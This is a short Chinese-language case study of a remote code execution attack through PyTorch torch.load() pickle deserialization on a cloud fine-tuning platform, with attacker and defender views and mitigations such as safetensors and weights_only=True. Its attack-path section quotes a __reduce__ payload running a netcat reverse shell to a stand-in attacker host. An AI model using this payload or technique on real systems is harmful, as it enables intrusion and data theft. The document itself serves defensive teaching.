# 针对深度学习框架 (PyTorch) 反序列化漏洞的远程代码执行攻击
- **所属领域**: AI 安全
- **威胁类型**: 基础设施安全 / 反序列化漏洞 / 远程代码执行
- **事件回顾**: 某 AI 初创公司开发了一款允许用户上传自定义模型权重以进行在线微调的云端平台。由于底层代码直接使用了 PyTorch 的 `torch.load()` 方法加载用户上传的模型文件，黑客利用了该方法处理 Pickle 序列化格式的已知安全缺陷，成功在云端微调节点上执行了恶意 Shell 命令，不仅窃取了公司其他的专有模型数据，还横向渗透进了内网开发环境。
- **Red View (利用路径)**: 深度学习模型权重（如 .pt 或 .pth 文件）在 PyTorch 中默认使用 Python 的 `pickle` 模块进行序列化和反序列化。攻击者在本地编写恶意的 Python 类，重写其 `__reduce__` 方法以包含危险的系统调用（如 `os.system('nc -e /bin/sh attacker.com 4444')`），然后将这个恶意类实例与正常的模型权重一起打包序列化为恶意的 .pth 文件。当云平台后端使用 `torch.load()` 尝试读取该模型文件时，`pickle` 机制会自动执行 `__reduce__` 中定义的恶意代码，从而导致远程代码执行。
- **Blue View (防御缺失)**: 开发团队忽视了官方文档中关于“不要 `torch.load()` 不受信任来源的文件”的明确安全警告。系统架构设计上缺乏纵深防御，上传处理模块未与核心内网隔离。未采用更安全的序列化格式（如不包含可执行代码的 `safetensors`）来替代容易被利用的 `pickle` 格式。
- **策略借鉴**: 废弃并禁止使用容易产生安全风险的序列化格式处理来自外部的模型数据，全面转向安全且高效的 `safetensors` 格式；如果必须使用 `torch.load()`，务必设置 `weights_only=True` 参数以限制反序列化过程仅加载张量数据而不执行任意代码；在隔离的沙箱或容器环境中执行不受信任的模型加载操作，并限制网络外连和文件系统权限；部署反序列化漏洞检测规则到 WAF 或运行时自保护 (RASP) 平台。
